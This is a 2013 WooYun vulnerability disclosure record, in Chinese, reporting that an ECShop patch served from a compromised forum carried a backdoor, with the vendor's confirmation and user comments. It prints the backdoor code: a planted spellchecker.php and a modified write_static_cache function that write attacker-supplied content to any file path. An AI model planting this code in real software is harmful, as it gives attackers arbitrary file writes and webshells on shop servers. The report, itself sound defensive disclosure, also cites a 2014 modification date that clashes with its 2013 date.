{"id": 10249, "wybug_id": "wooyun-2013-024796", "wybug_title": "ecshop最新补丁含有webshell，请各位站长注意！", "wybug_corp": "ShopEx", "wybug_author": "齐迹", "wybug_date": "2013-05-30 12:06", "wybug_open_date": "2013-08-28 12:07", "wybug_type": "补丁后门", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["补丁后门"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-28：\t细节向公众公开  简要描述： ecshop最新（2013年5月6日）补丁含有后门，请各位站长注意！补丁地址http://bbs.ecshop.com/viewthread.php?tid=1129622 下载过的请及时处理。同时希望官方以公告方式告知！ 详细说明：  官方已经停止了补丁的下载。我是从第三方 下载的补丁(ecmoban.com)下载的补丁我开始以为是第三方故意写的后门于是联系了 ecmoban的人员。确定是ec论坛被挂马导致的shell位置includes\\fckeditor\\editor\\dialog\\fck_spellerpages\\spellerpages\\server-scripts\\spellchecker.php\n@include(\"../../../../../../lib_base.php\");$newname = $_POST['newname'];$newfile = $_POST['newfile'];write_static_cache($cache_name,$caches,$newname,$newfile);\n同时这位黑阔还修改了lib_base.php文件的write_static_cache方法\nfunction write_static_cache($cache_name,$caches,$newname,$newfile){    if (!empty($cache_name)){\t   if ((DEBUG_MODE & 2) == 2)    {        return false;    }    $cache_file_path = ROOT_PATH . '/temp/static_caches/' . $cache_name . '.php';    $content = \"<?php\\r\\n\";    $content .= \"\\$data = \" . var_export($caches, true) . \";\\r\\n\";    $content .= \"?>\";    file_put_contents($cache_file_path, $content, LOCK_EX);}else{@file_put_contents($newfile, $newname);}}\n基本上文件修改时间是2014年12月25日的都动过手脚！   漏洞证明：  下图 是我和模板堂的朋友得到的确认消息\n\n\n\n   修复方案：  犯了错。要敢于承认错误！   版权声明：转载请注明来源 齐迹@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2013-05-30 12:27 厂商回复： 由于EcShop论坛被黑，导致帖子中补丁下载地址被修改导致，现已对论坛中其他补丁下载地址做处理。在最新的官方补丁中会更新被替换的文件感谢您为shopex安全做的贡献我们今后将加强对官方发布平台安全策略非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-30 12:07 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  我草！！！    \n     2013-05-30 12:10 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  @xsser 去下补丁。。。    \n     2013-05-30 12:11 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  @淡漠天空 补丁已经不能下载了。只是同情那些下载过补丁的站长们小心了！    \n     2013-05-30 12:15 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @齐迹 官方看来应该更严格注意安全    \n     2013-05-30 12:17 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  @齐迹 默哀一分钟    \n     2013-05-30 12:21 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  我艹...    \n     2013-05-30 14:29 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  我次奥。。    \n     2013-05-30 19:05 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  。。。    \n     2013-06-09 14:26 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  好严重的一个问题 wb好滴    \n     2013-07-10 11:40 |    \t\t核攻击 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:7        | 统治全球，奴役全人类！毁灭任何胆敢阻拦的...)\t\t \n  我嘞个大艹！史前巨操！    \n     2013-08-28 13:16 |    \t\tIvan \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:9        | 小菜逼一个)\t\t \n  没准是监守自盗    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}